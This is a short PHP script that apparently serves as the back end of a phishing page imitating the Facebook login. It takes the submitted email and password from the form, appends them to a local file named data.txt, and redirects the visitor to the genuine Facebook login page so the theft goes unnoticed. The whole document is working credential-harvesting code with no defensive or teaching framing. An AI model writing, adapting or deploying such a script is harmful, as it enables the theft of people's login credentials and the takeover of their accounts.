<?php

header ('Location: https://facebook.com/login');

$email = $_POST['email'];
$password = $_POST['pass'];


  $open = fopen('data.txt','a');
  fwrite($open,$email);
  fwrite($open, '::');
  fwrite($open,$password);
  fwrite($open, ' |||| ');


?>